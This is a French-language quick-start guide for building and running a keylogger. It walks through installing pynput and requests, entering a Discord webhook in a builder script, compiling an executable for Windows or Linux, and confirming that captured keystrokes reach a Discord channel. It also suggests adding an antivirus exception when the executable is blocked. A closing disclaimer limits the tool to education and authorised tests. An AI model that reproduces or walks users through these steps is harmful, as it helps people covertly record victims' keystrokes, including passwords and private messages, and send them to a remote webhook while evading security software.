# 🚀 Guide de Démarrage Rapide

## Installation en 3 étapes

### 1️⃣ Installer les dépendances

```bash
pip install -r requirements.txt
```

### 2️⃣ Configurer le keylogger

```bash
python builder.py
```

Suivez les instructions interactives :
- Entrez votre webhook Discord
- Choisissez l'intervalle d'envoi (ex: 60 secondes)
- Sélectionnez le type de build (script ou exécutable)

### 3️⃣ Exécuter

```bash
# Si vous avez choisi un script Python
python build/keylogger_configured.py

# Si vous avez choisi un exécutable
./build/dist/keylogger        # Linux
build\dist\keylogger.exe      # Windows
```

## 📱 Créer un Webhook Discord (30 secondes)

1. **Ouvrir Discord** → Aller sur votre serveur
2. **Paramètres du serveur** → Intégrations → Webhooks
3. **Nouveau Webhook** → Nommer le webhook
4. **Copier l'URL** → Ressemble à `https://discord.com/api/webhooks/...`
5. **Coller dans le builder** quand demandé

## ⚡ Build Rapide (Ligne de commande)

```bash
python builder.py "https://discord.com/api/webhooks/VOTRE_WEBHOOK" 60 keylogger.py
python build/keylogger.py
```

## 🧪 Test Rapide

1. Lancer le keylogger
2. Taper quelques mots dans n'importe quelle application
3. Attendre l'intervalle configuré (ex: 60 secondes)
4. Vérifier votre canal Discord

## 🐛 Problèmes Courants

### Module 'pynput' non trouvé
```bash
pip install pynput requests
```

### Permission refusée (Linux)
```bash
sudo usermod -a -G input $USER
# Déconnectez-vous puis reconnectez-vous
```

### Antivirus bloque l'exécutable
- Ajouter une exception pour le dossier du projet
- Tester dans une VM

## ⚠️ Rappel Important

**Ce tool est UNIQUEMENT pour l'éducation et les tests autorisés !**

Assurez-vous d'avoir :
- ✅ L'autorisation écrite du propriétaire du système
- ✅ Un contexte éducatif légitime (devoir, CTF, etc.)
- ✅ Une machine de test dédiée ou VM

---

Pour plus d'informations, consultez le [README complet](README.md)
